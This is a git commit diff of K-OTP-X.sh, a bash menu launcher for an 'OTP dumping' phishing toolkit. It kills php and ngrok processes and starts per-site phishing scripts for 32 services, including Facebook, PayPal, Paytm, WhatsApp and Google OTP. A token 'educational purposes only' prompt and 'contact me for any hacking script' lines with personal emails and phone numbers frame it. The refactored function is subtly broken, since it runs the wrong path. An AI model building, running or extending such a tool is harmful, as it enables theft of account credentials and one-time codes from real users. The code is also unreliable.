d58f3df2406fefccedb51e27967de7cefc09ed54
almezali <mzmcs@hotmail.com>
2025-02-12 19:55:14 +0200

    Update K-OTP-X.sh

--- K-OTP-X.sh
+++ K-OTP-X.sh
@@ -1,37 +1,41 @@
 #!/bin/bash
 clear
-echo ""
-echo ""
-echo ""
+
+# Function to execute scripts
+execute_script() {
+    local script_path="sites/$1/$1.sh"
+    if [[ -d "sites/$1" && -f "$script_path" ]]; then
+        chmod 7777 "$script_path"
+        ./$1.sh
+    else
+        echo -e "\e[1;31mError: Directory or script for $1 not found!\e[0m"
+    fi
+}
+
+# Initial prompt
 read -p $'\e[1;32m\e[0m\e[1;37mCODDED BY KAMALDEEP & T H I S - T O O L - F O R - E D U C A T I O N A l - P U R P O S E S - O N L Y ? \e[1;33m\e[0m\e[1;33m (Y/N) : \e[0m' option
-echo""
-echo""
-echo""
-
-if [[ $option == *'N'* ]]; then
-clear
-exit
-fi
-if [[ $option == *'n'* ]]; then
-clear
-exit
+if [[ $option =~ [Nn] ]]; then
+    clear
+    exit
 fi
 
+# Kill existing processes
 php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
 ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
 kill -9 $php
 kill -9 $ngrok
 clear
 
-clear
 chmod 777 Logo.sh
 ./Logo.sh
-echo ""
-echo -e $'         \e[1;32m\e[0m\e[1;32m || <= SELECT OTP DUMPING PLATFORM => ||  \e[0m'
-echo -e $'     \e[1;37m\e[0m\e[1;37m   ------------------------------------ > > >\e[0m'
-echo -e $'     \e[1;37m\e[0m\e[1;37m   < < < ------------------------------------      \e[0m'
+
+# Menu
+echo -e $'\e[1;32m || <= SELECT OTP DUMPING PLATFORM => ||  \e[0m'
+echo -e $'\e[1;37m   ------------------------------------ > > >\e[0m'
+echo -e $'\e[1;37m   < < < ------------------------------------      \e[0m'
 echo ""
 
+# Display options
 printf "\e[1;32m[\e[0m\e[1;77m01\e[0m\e[1;32m]\e[0m\e[1;32m Tiktok\e[0m                 \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Zomato\e[0m         \e[1;92m[\e[0m\e[1;77m0\e[0m\e[1;92m]\e[0m\e[1;37m Exit--!>         \n"                                                                       
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;32m Facebook\e[0m               \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m PhonePay\e[0m       \e[0m\n"                                                                                                                    
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;32m Instagram\e[0m              \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;93m Paypal\e[0m         \e[0m\n"                                                                                           
@@ -53,248 +57,46 @@ printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m IPFinder\e[0m       
 echo "" 
 echo ""
                 
-                 read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
-		 case $option in 
-			 
-                         1)cd sites/ 
-                           cd tiktok/
-                           chmod 7777 tiktok.sh  
-                           ./tiktok.sh 
-
-
-                ;;
-	        
-	        2)cd sites/
-                  cd facebook/
-                  chmod 7777 facebook.sh  
-                  ./facebook.sh 
-
-
-
-                ;;
-
-                3) cd sites/
-                  cd instagram/
-                  chmod 7777 instagram.sh 
-                  ./instagram.sh 
-
-                ;;
-
-                4)cd sites/
-                  cd UberEats-Phishing/
-                  chmod 7777 Uber-eats.sh 
-                  ./Uber-eats.sh 
-               
-                ;;
-                 
-                5) cd sites/
-                  cd ola-otpbypass/
-                  chmod 7777 ola.sh  
-                  ./ola.sh
-                ;;
-                
-                6)cd sites/
-                  cd google-otp/
-                  chmod 7777 Google-otp.sh 
-                  ./Google-otp.sh
-
-                ;;
-  
-                7)cd sites/
-                  cd Paytm-Phishing/
-                  chmod 7777 Paytm.sh 
-                  ./Paytm.sh
- 
-                ;;
-
-                8)cd sites/
-                  cd Netflix/
-                  chmod 7777 Netflix.sh   
-                  ./Netflix.sh 
-
-                ;;
-
-
-               9)cd sites/
-                  cd instafollow/
-                  chmod 7777 instafollow.sh
-                  ./instafollow.sh
-
-                ;;
-
-               10)cd sites/
-                  cd amazonsign/
-                  chmod 7777 amazonsign.sh  
-                  ./amazonsign.sh
-
-                ;;
-
-                11)cd sites/
-                  cd whatsapp-phishing/
-                  chmod 7777 Whatsapp.sh  
-                  ./Whatsapp.sh
-
-                ;;
-
-                12)cd sites/
-                  cd Linkedin/
-                  chmod 7777 Linkedin.sh 
-                  ./Linkedin.sh
-
-                ;;
-   
-                13)cd sites/
-                  cd Hotstar-otp-bypass/
-                  chmod 7777 Hotstar.sh  
-                  ./Hotstar.sh
-
-                ;;
-      
-                14)cd sites/
-                  cd spotify/
-                  chmod 7777 spotify.sh 
-                  ./spotify.sh
-
-                ;;
-
-                15)cd sites/
-                  cd github/
-                  chmod 7777 github.sh 
-                  ./github.sh
-
-                ;;
-
-                16)cd sites/
-                   cd ipfinder/
-                   chmod 7777 ipfinder.sh  
-                  ./ipfinder.sh
-
-                ;;
-                  
-                 17)cd sites/ 
-                    cd Zomato-Phishing/
-                    chmod 7777 Zomato.sh  
-                    ./Zomato.sh 
-
-
-                ;;
-	        
-	        18)cd sites/
-                  cd phonepay/
-                  chmod 7777 phonepay.sh  
-                  ./phonepay.sh 
-
-
-
-                ;;
-
-                19) cd sites/
-                  cd paypal/
-                  chmod 7777 paypal.sh 
-                  ./paypal.sh 
-
-                ;;
-
-                20)cd sites/
-                  cd telegram/
-                  chmod 7777 telegram.sh 
-                  ./telegram.sh 
-               
-                ;;
-                 
-                21) cd sites/
-                  cd twitter/
-                  chmod 7777 twitter.sh  
-                  ./twitter.sh
-                ;;
-                
-                22)cd sites/
-                  cd flipcart/
-                  chmod 7777 flipcart.sh 
-                  ./flipcart.sh
-
-                ;;
-  
-                23)cd sites/
-                  cd wordpress/
-                  chmod 7777 wordpress.sh 
-                  ./wordpress.sh
- 
-                ;;
-
-                24)cd sites/
-                  cd snapchat/
-                  chmod 7777 snapchat.sh   
-                  ./snapchat.sh 
-
-                ;;
-
-
-               25)cd sites/
-                  cd protonmail/
-                  chmod 7777 protonmail.sh
-                  ./protonmail.sh
-
-                ;;
-
-               26)cd sites/
-                  cd stackoverflow/
-                  chmod 7777 stackoverflow.sh  
-                  ./stackoverflow.sh
-
-                ;;
-
-                27)cd sites/
-                  cd ebay/
-                  chmod 7777 ebay.sh  
-                  ./ebay.sh
-
-                ;;
-
-                28)cd sites/
-                  cd twitch/
-                  chmod 7777 twitch.sh 
-                  ./twitch.sh
-
-                ;;
-   
-                29)cd sites/
-                  cd ajio/
-                  chmod 7777 ajio.sh  
-                  ./ajio.sh
-
-                ;;
-      
-                30)cd sites/
-                  cd cryptocurrency/
-                  chmod 7777 cryptocurrency.sh 
-                  ./cryptocurrency.sh
-
-                ;;
-
-                31)cd sites/
-                  cd mobikwik/
-                  chmod 7777 mobikwik.sh 
-                  ./mobikwik.sh
-
-                ;;
-
-                32)cd sites/
-                   cd pinterest/
-                   chmod 7777 pinterest.sh  
-                  ./pinterest.sh
-
-                ;;
-
-
-                0)echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m << THANKS FOR USING KAMALDEEPs SCRIPT {{-- K-OTP X --} >> \e[0m'
-                  echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m << Contact Me for any Hacking Script ==> \e[0m'
-                  echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m << EMAIL : Kamaldeepsingh9821@gmail.com >> \e[0m' 
-                  echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m << WhatsApp : +254 738 200067 >> \e[0m' 
-                   sleep 1
-                   exit
-                ;;
-
-
-                esac
-                ;;
+read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
+case $option in 
+    1) execute_script "tiktok" ;;  
+    2) execute_script "facebook" ;;  
+    3) execute_script "instagram" ;;  
+    4) execute_script "UberEats-Phishing" ;;  
+    5) execute_script "ola-otpbypass" ;;  
+    6) execute_script "google-otp" ;;  
+    7) execute_script "Paytm-Phishing" ;;  
+    8) execute_script "Netflix" ;;  
+    9) execute_script "instafollow" ;;  
+    10) execute_script "amazonsign" ;;  
+    11) execute_script "whatsapp-phishing" ;;  
+    12) execute_script "Linkedin" ;;  
+    13) execute_script "Hotstar-otp-bypass" ;;  
+    14) execute_script "spotify" ;;  
+    15) execute_script "github" ;;  
+    16) execute_script "ipfinder" ;;  
+    17) execute_script "Zomato-Phishing" ;;  
+    18) execute_script "phonepay" ;;  
+    19) execute_script "paypal" ;;  
+    20) execute_script "telegram" ;;  
+    21) execute_script "twitter" ;;  
+    22) execute_script "flipcart" ;;  
+    23) execute_script "wordpress" ;;  
+    24) execute_script "snapchat" ;;  
+    25) execute_script "protonmail" ;;  
+    26) execute_script "stackoverflow" ;;  
+    27) execute_script "ebay" ;;  
+    28) execute_script "twitch" ;;  
+    29) execute_script "ajio" ;;  
+    30) execute_script "cryptocurrency" ;;  
+    31) execute_script "mobikwik" ;;  
+    32) execute_script "pinterest" ;;  
+    0) echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m << THANKS FOR USING K-OTP-X SCRIPT {{-- K-OTP X --} >> \e[0m'
+        echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m << Contact Me for any TOOL$ Script ==> \e[0m'
+        echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m << EMAIL : mzmcsmzm@gmail.com >> \e[0m' 
+        echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m << WhatsApp : +2 01122929727 >> \e[0m' 
+        sleep 1
+        exit
+    ;;
+    *) echo -e "\e[1;31mInvalid option!\e[0m" ;;
+esac
